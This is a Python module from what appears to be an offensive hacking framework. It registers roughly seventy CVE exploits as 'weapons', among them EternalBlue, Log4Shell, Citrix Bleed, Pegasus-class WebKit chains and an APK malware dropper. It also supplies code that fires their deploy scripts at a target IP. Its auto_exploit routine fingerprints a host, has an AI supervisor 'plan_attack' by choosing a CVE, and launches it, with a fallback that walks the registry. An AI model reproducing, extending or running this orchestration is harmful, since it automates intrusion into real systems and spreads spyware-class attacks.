"""quantum.weapons.registry — ZERO_DAY_REGISTRY + fire contract + orchestrator."""
from __future__ import annotations

import json
import os
import subprocess

from quantum.core.logging import log

# repo-root/exploit_payloads — per-CVE operator tooling folders.
# Each folder holds a deploy.py that speaks the JSON + exit-code contract.
PAYLOADS_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))))), "exploit_payloads")

# ----------------------------------------------------------------------------
# ZERO_DAY_REGISTRY — weapon entries reference callables BY NAME; resolution
# happens at fire-time via resolve_weapon() so tiers stay lazy-importable.
# ----------------------------------------------------------------------------

ZERO_DAY_REGISTRY = {
    # ---- legacy ----
    "CVE-2020-1472": {"name": "Zerologon", "tier": "legacy", "weapon": "check_zerologon", "folder": "CVE-2020-1472-zerologon", "needs_target": True},
    "CVE-2017-0144": {"name": "EternalBlue", "tier": "legacy", "weapon": "check_ms17010", "folder": "CVE-2017-0144-eternalblue", "needs_target": True},
    "CVE-2021-1675": {"name": "PrintNightmare", "tier": "legacy", "weapon": "check_printnightmare", "folder": "CVE-2021-1675-printnightmare", "needs_target": True},
    "CVE-2021-36942": {"name": "PetitPotam", "tier": "legacy", "weapon": "check_petitpotam", "folder": "CVE-2021-36942-petitpotam", "needs_target": True},
    "CVE-2022-30190": {"name": "Follina MSDT", "tier": "legacy", "weapon": "check_follina", "folder": "CVE-2022-30190-follina"},
    "CVE-2021-26855": {"name": "ProxyLogon", "tier": "legacy", "weapon": "check_proxylogon", "folder": "CVE-2021-26855-proxylogon", "needs_target": True},
    # ---- V3_HIGH ----
    "CVE-2021-44228": {"name": "Log4Shell", "tier": "V3_HIGH", "weapon": "v3_log4shell", "folder": "CVE-2021-44228-log4shell", "needs_target": True},
    "CVE-2024-3400": {"name": "PAN-OS GlobalProtect", "tier": "V3_HIGH", "weapon": "v3_panos_cmd", "folder": "CVE-2024-3400-panos-globalprotect", "needs_target": True},
    "CVE-2023-4966": {"name": "Citrix Bleed", "tier": "V3_HIGH", "weapon": "v3_citrixbleed", "folder": "CVE-2023-4966-citrix-bleed", "needs_target": True},
    "CVE-2019-19781": {"name": "Citrix Path Traversal", "tier": "V3_HIGH", "weapon": "v3_citrix_path", "folder": "CVE-2019-19781-citrix-path-traversal", "needs_target": True},
    "CVE-2023-20198": {"name": "IOS XE Web UI", "tier": "V3_HIGH", "weapon": "v3_ios_admin", "folder": "CVE-2023-20198-iosxe-webui", "needs_target": True},
    "CVE-2022-26134": {"name": "Confluence OGNL", "tier": "V3_HIGH", "weapon": "v3_confluence_ognl", "folder": "CVE-2022-26134-confluence-ognl", "needs_target": True},
    "CVE-2020-14882": {"name": "WebLogic Console", "tier": "V3_HIGH", "weapon": "v3_weblogic_console", "folder": "CVE-2020-14882-weblogic-console", "needs_target": True},
    "CVE-2021-40444": {"name": "MSHTML Maldoc", "tier": "V3_HIGH", "weapon": "v3_mshtml_maldoc", "folder": "CVE-2021-40444-mshtml-maldoc"},
    # ---- V3_MED ----
    "CVE-2017-7494": {"name": "SambaCry", "tier": "V3_MED", "weapon": "v3_sambacry", "folder": "CVE-2017-7494-sambacry", "needs_target": True},
    "CVE-2021-21972": {"name": "vCenter Upload", "tier": "V3_MED", "weapon": "v3_vcenter_upload", "folder": "CVE-2021-21972-vcenter-upload", "needs_target": True},
    "CVE-2022-0847": {"name": "Dirty Pipe", "tier": "V3_HIGH", "weapon": "v3_dirtypipe", "folder": "CVE-2022-0847-dirtypipe"},
    "CVE-2016-5195": {"name": "Dirty COW", "tier": "V3_MED", "weapon": "v3_dirtypipe"},
    # ---- V3_CHECK ----
    "CVE-2023-34362": {"name": "MOVEit SQLi", "tier": "V3_CHECK", "weapon": "v3_moveit_probe", "folder": "CVE-2023-34362-moveit-sqli", "needs_target": True},
    "CVE-2021-3156": {"name": "Baron Samedit", "tier": "V3_CHECK", "weapon": "check_baron_samedit", "folder": "CVE-2021-3156-baron-samedit"},
    "CVE-2021-4034": {"name": "PwnKit", "tier": "V3_CHECK", "weapon": "check_pwnkit", "folder": "CVE-2021-4034-pwnkit"},
    "CVE-2023-2640": {"name": "Overlayfs GameOver", "tier": "V3_CHECK", "weapon": "check_overlayfs", "folder": "CVE-2023-2640-overlayfs"},
    "CVE-2023-32233": {"name": "nf_tables UAF", "tier": "V3_CHECK", "weapon": "check_nftables_uaf", "folder": "CVE-2023-32233-nftables-uaf"},
    "CVE-2024-1086": {"name": "nf_tables dbl-free", "tier": "V3_CHECK", "weapon": "check_nftables_dblfree", "folder": "CVE-2024-1086-nftables-dblfree"},
    "CVE-2019-3568": {"name": "WhatsApp VOIP", "tier": "V3_CHECK", "weapon": "check_whatsapp_voip", "folder": "CVE-2019-3568-whatsapp-voip"},
    "CVE-2023-4863": {"name": "libwebp BLASTPAST", "tier": "V3_CHECK", "weapon": "check_libwebp", "folder": "CVE-2023-4863-libwebp"},
    "CVE-2023-41064": {"name": "Apple ImageIO", "tier": "V3_CHECK", "weapon": "check_apple_imageio", "folder": "CVE-2023-41064-apple-imageio"},
    "CVE-2021-30858": {"name": "WebKit Escape", "tier": "V3_CHECK", "weapon": "check_webkit_escape", "folder": "CVE-2021-30858-webkit-escape"},
    "CVE-2022-21894": {"name": "BootHole", "tier": "V3_CHECK", "weapon": "check_boothole", "folder": "CVE-2022-21894-boothole"},
    # ---- V3_HIGH (remote probes) ----
    "CVE-2021-34473": {"name": "ProxyShell", "tier": "V3_HIGH", "weapon": "v3_proxyshell", "folder": "CVE-2021-34473-proxyshell", "needs_target": True},
    "CVE-2022-41040": {"name": "ProxyNotShell", "tier": "V3_HIGH", "weapon": "v3_proxynotshell", "folder": "CVE-2022-41040-proxynotshell", "needs_target": True},
    "CVE-2021-35464": {"name": "ForgeRock AM", "tier": "V3_HIGH", "weapon": "v3_forgerock", "folder": "CVE-2021-35464-forgerock", "needs_target": True},
    "CVE-2022-22965": {"name": "Spring4Shell", "tier": "V3_HIGH", "weapon": "v3_spring4shell", "folder": "CVE-2022-22965-spring4shell", "needs_target": True},
    "CVE-2022-27492": {"name": "WhatsApp libmultiple", "tier": "V3_HIGH", "weapon": "v3_whatsapp_libmultiple", "folder": "CVE-2022-27492-whatsapp-libmultiple"},
    "CVE-2023-0669": {"name": "GoAnywhere", "tier": "V3_HIGH", "weapon": "v3_goanywhere", "folder": "CVE-2023-0669-goanywhere", "needs_target": True},
    "CVE-2023-27350": {"name": "PaperCut", "tier": "V3_HIGH", "weapon": "v3_papercut", "folder": "CVE-2023-27350-papercut", "needs_target": True},
    "CVE-2023-35078": {"name": "Ivanti EPMM", "tier": "V3_HIGH", "weapon": "v3_ivanti_epmm", "folder": "CVE-2023-35078-ivanti-epmm", "needs_target": True},
    "CVE-2024-1709": {"name": "ScreenConnect", "tier": "V3_HIGH", "weapon": "v3_screenconnect", "folder": "CVE-2024-1709-screenconnect", "needs_target": True},
    "CVE-2024-47575": {"name": "FortiManager", "tier": "V3_HIGH", "weapon": "v3_fortimanager", "folder": "CVE-2024-47575-fortimanager", "needs_target": True},
    "CVE-2025-0282": {"name": "Ivanti Connect Secure", "tier": "V3_HIGH", "weapon": "v3_ivanti_connect", "folder": "CVE-2025-0282-ivanti-connect-secure", "needs_target": True},
    "CVE-2025-31324": {"name": "SAP NetWeaver", "tier": "V3_HIGH", "weapon": "v3_sap_netweaver", "folder": "CVE-2025-31324-sap-netweaver", "needs_target": True},
    "CVE-2025-5777": {"name": "Citrix Bleed 2", "tier": "V3_HIGH", "weapon": "v3_citrixbleed2", "folder": "CVE-2025-5777-citrix-bleed2", "needs_target": True},
    "CVE-2024-6387": {"name": "regreSSHion", "tier": "V3_HIGH", "weapon": "v3_regresshion", "folder": "CVE-2024-6387-regresssion", "needs_target": True},
    "CVE-2026-0073": {"name": "adbd TLS bypass", "tier": "V3_HIGH", "weapon": "v3_adb_tls", "folder": "CVE-2026-0073-adb-tls-bypass", "needs_target": True},
    # ---- V3_CHECK (zero-click staging checks) ----
    "CVE-2021-30860": {"name": "FORCEDENTRY", "tier": "V3_CHECK", "weapon": "check_forcedentry", "folder": "CVE-2021-30860-forcedentry"},
    "CVE-2023-41061": {"name": "BLASTPASS Wallet", "tier": "V3_CHECK", "weapon": "check_blastpass_wallet", "folder": "CVE-2023-41061-blastpass-wallet"},
    "CVE-2023-32409": {"name": "WebKit type confusion", "tier": "V3_CHECK", "weapon": "check_webkit_typeconf", "folder": "CVE-2023-32409-webkit-type-confusion"},
    "CVE-2023-32435": {"name": "Triangulation WebKit", "tier": "V3_CHECK", "weapon": "check_triangulation_webkit", "folder": "CVE-2023-32435-triangulation-webkit"},
    "CVE-2023-32434": {"name": "Triangulation kernel", "tier": "V3_CHECK", "weapon": "check_triangulation_kernel", "folder": "CVE-2023-32434-triangulation-kernel"},
    "CVE-2023-42924": {"name": "WebKit ITW 2023", "tier": "V3_CHECK", "weapon": "check_webkit_itw_2023", "folder": "CVE-2023-42924-webkit-itw"},
    "CVE-2024-4438": {"name": "WebKit Intellexa", "tier": "V3_CHECK", "weapon": "check_webkit_intellexa", "folder": "CVE-2024-4438-webkit-intellexa"},
    "CVE-2025-24085": {"name": "WebKit ITW 2025", "tier": "V3_CHECK", "weapon": "check_webkit_itw_2025", "folder": "CVE-2025-24085-webkit-itw"},
    "CVE-2025-41300": {"name": "Pegasus WebKit", "tier": "V3_CHECK", "weapon": "check_pegasus_webkit", "folder": "CVE-2025-41300-pegasus-webkit"},
    "CVE-2024-23225": {"name": "iOS kernel", "tier": "V3_CHECK", "weapon": "check_ios_kernel", "folder": "CVE-2024-23225-ios-kernel"},
    "CVE-2022-44319": {"name": "Samsung baseband", "tier": "V3_CHECK", "weapon": "check_samsung_baseband", "folder": "CVE-2022-44319-samsung-baseband"},
    "CVE-2023-24033": {"name": "Exynos baseband", "tier": "V3_CHECK", "weapon": "check_exynos_baseband", "folder": "CVE-2023-24033-exynos-baseband"},
    "CVE-2017-13077": {"name": "KRACK", "tier": "V3_CHECK", "weapon": "check_krack", "folder": "CVE-2017-13077-krack"},
    "CVE-2020-0022": {"name": "BlueFrag", "tier": "V3_CHECK", "weapon": "check_bluefrag", "folder": "CVE-2020-0022-bluefrag"},
    "CVE-2023-45866": {"name": "BT HID injection", "tier": "V3_CHECK", "weapon": "check_bt_hid", "folder": "CVE-2023-45866-bt-hid-injection"},
    "CVE-2023-23397": {"name": "Outlook NTLM leak", "tier": "V3_CHECK", "weapon": "check_outlook_ntlm", "folder": "CVE-2023-23397-outlook-ntlm-leak"},
    "CVE-2023-36884": {"name": "Office HTML", "tier": "V3_CHECK", "weapon": "check_office_html", "folder": "CVE-2023-36884-office-html"},
    "CVE-2025-32711": {"name": "EchoLeak", "tier": "V3_CHECK", "weapon": "check_echoleak", "folder": "CVE-2025-32711-echoleak"},
    # ---- bluetooth tier (BlueBorne family + BlackBED BLE staging) ----
    "CVE-2017-0781": {"name": "BlueBorne BNEP", "tier": "V3_CHECK", "weapon": "check_blueborne_bnep"},
    "CVE-2017-0785": {"name": "BlueBorne SDP", "tier": "V3_CHECK", "weapon": "check_blueborne_sdp"},
    "CVE-2018-5383": {"name": "Bluetooth KNOB", "tier": "V3_CHECK", "weapon": "check_knob"},
    "BLACKBED-BLE": {"name": "BlackBED BLE", "tier": "V3_CHECK", "weapon": "check_blackbed"},
    # ---- malware-class operator tooling (APK wrapper dropper) ----
    "MALWARE-APK-WRAPPER-NECRO": {"name": "APK Wrapper (Necro-class)", "tier": "V3_CHECK",
                                  "weapon": "check_malware_apk_wrapper",
                                  "folder": "MALWARE-apk-wrapper-necro-class"},
}


def resolve_weapon(name):
    """Resolve a weapon name (string) to its callable, tier by tier."""
    import quantum.weapons.kernel_v3 as _k
    import quantum.weapons.legacy as _l
    import quantum.weapons.media_v3 as _m
    import quantum.weapons.remote_v3 as _r
    import quantum.weapons.bluetooth as _b
    import quantum.weapons.malware as _mw
    for mod in (_r, _k, _m, _l, _b, _mw):
        fn = getattr(mod, name, None)
        if callable(fn):
            return fn
    return None


def _fire_folder(cve, entry, ip, params):
    """Run a payload-folder deploy.py. Default args: --target probe when the
    entry needs a target, else forge the delivery payload to a temp file.
    Operators override the full CLI via params={"args": [...]}. Never raises;
    deploy.py's own JSON + exit-code contract is passed through."""
    import sys
    import tempfile
    params = params or {}
    deploy = os.path.join(PAYLOADS_DIR, entry["folder"], "deploy.py")
    if not os.path.isfile(deploy):
        return {"cve": cve, "status": "error", "error": "deploy.py missing"}
    args = [str(a) for a in (params.get("args") or [])]
    if not args:
        if entry.get("needs_target"):
            args = ["--target", str(ip), "--timeout", str(params.get("timeout", 5))]
        else:
            outdir = os.path.join(tempfile.gettempdir(), "qcli")
            try:
                os.makedirs(outdir, exist_ok=True)
            except OSError:
                outdir = tempfile.gettempdir()
            args = ["--out", os.path.join(outdir, cve.replace("/", "_") + ".bin")]
    try:
        proc = subprocess.run(
            [sys.executable, deploy, *args],
            capture_output=True, text=True,
            timeout=float(params.get("proc_timeout", 90)),
            cwd=os.path.dirname(deploy))
    except Exception as exc:
        return {"cve": cve, "status": "error", "error": str(exc)}
    try:
        payload = json.loads(proc.stdout or "{}")
    except Exception:
        payload = None
    status = "ok" if proc.returncode == 0 else "error"
    if isinstance(payload, dict):
        payload.setdefault("cve", cve)
        payload.setdefault("status", status)
        return payload
    if payload is not None:
        return {"cve": cve, "status": status, "result": payload}
    raw = ((proc.stdout or "") + (proc.stderr or ""))[:2000]
    out = {"cve": cve, "status": status}
    if status == "error":
        # Surface why the payload failed — the deploy.py stdout/stderr is
        # the only diagnostic the operator gets.
        out["error"] = (raw.strip() or f"deploy.py exited {proc.returncode}")
    else:
        out["raw"] = raw
    return out


class _Registry:
    """registry.fire(cve, ip, params) — every weapon string in
    ZERO_DAY_REGISTRY resolves to a callable; never raises."""

    def __contains__(self, cve):
        return cve in ZERO_DAY_REGISTRY

    def __iter__(self):
        return iter(ZERO_DAY_REGISTRY)

    def cves(self):
        return list(ZERO_DAY_REGISTRY)

    def fire(self, cve, ip, params=None):
        entry = ZERO_DAY_REGISTRY.get(cve)
        if not entry:
            raise KeyError(f"unknown CVE: {cve}")
        if entry.get("folder"):
            return _fire_folder(cve, entry, ip, params)
        fn = resolve_weapon(entry["weapon"])
        if not callable(fn):
            return {"cve": cve, "status": "error",
                    "error": f"weapon {entry['weapon']!r} unresolved"}
        try:
            res = fn(ip, params)
        except Exception as exc:
            return {"cve": cve, "status": "error", "error": str(exc)}
        if isinstance(res, dict):
            return res
        return {"cve": cve, "status": "ok", "result": res}


registry = _Registry()


class ExploitOrchestrator:
    """V3 registry-aware fire stage + appliance-aware auto-exploit."""

    def __init__(self):
        from quantum.ai.supervisor import AI_Supervisor
        self.ai = AI_Supervisor()

    def source_exploits(self, keyword):
        found = []
        try:
            try:
                out = subprocess.check_output(["searchsploit", keyword], text=True, timeout=30)
                found += [{"src": "exploit-db", "match": l} for l in out.splitlines() if keyword in l]
            except FileNotFoundError:
                from quantum.core.opsec import OPSEC
                r = OPSEC.web("https://api.github.com/search/repositories",
                              params={"q": f"{keyword} exploit"}, timeout=10)
                found += [{"src": "github", "match": i["full_name"]} for i in r.json().get("items", [])[:10]]
        except Exception as e:
            log(f"exploit-db search: {e}", "WARN")
        return found

    def fire(self, cve, ip, params=None):
        if cve not in ZERO_DAY_REGISTRY:
            log(f"fire: '{cve}' not in registry", "WARN"); return {"error": cve}
        rec = ZERO_DAY_REGISTRY[cve]
        fn = resolve_weapon(rec["weapon"])
        if not callable(fn):
            return {"cve": cve, "status": "error", "error": f"weapon {rec['weapon']!r} unresolved"}
        return fn(ip, params)

    def auto_exploit(self, ip, params=None, force=False):
        from quantum.recon.fingerprint import Validator
        from quantum.recon.scan import ReconModule
        fp = ReconModule().fingerprint(ip)
        verdict = Validator().score(ip, fp)
        if verdict["decision"] != "high_value" and not force:
            log(f"auto_exploit skipped {ip} (VALIDATOR: {verdict['score']})", "ATK")
            return {"skipped": ip, "validator": verdict}
        cve = self.ai.plan_attack(fp)   # returns a bare CVE id (AI or QBrain)
        if cve in ZERO_DAY_REGISTRY:
            r = self.fire(cve, ip, params)
            log(f"auto_exploit: {ip} -> {cve} ({ZERO_DAY_REGISTRY[cve]['name']})", "ATK")
            return r
        # registry march fallback (deterministic)
        for cve, ent in ZERO_DAY_REGISTRY.items():
            probe = {"CVE-2017-0144": fp.get("ms17_010") is True,
                     "CVE-2020-1472": any(p in fp.get("ports", []) for p in (445, 135, 3389)),
                     "CVE-2021-44228": any(p in fp.get("ports", []) for p in (80, 443, 8080, 8000, 8443)),
                     "CVE-2021-26855": any(p in fp.get("ports", []) for p in (80, 443))}.get(cve, False)
            if probe:
                log(f"auto_exploit: no dedicated match for '{cve}' — registry march fires {cve}", "ATK")
                return self.fire(cve, ip, params)
        return {"error": "no match in registry"}
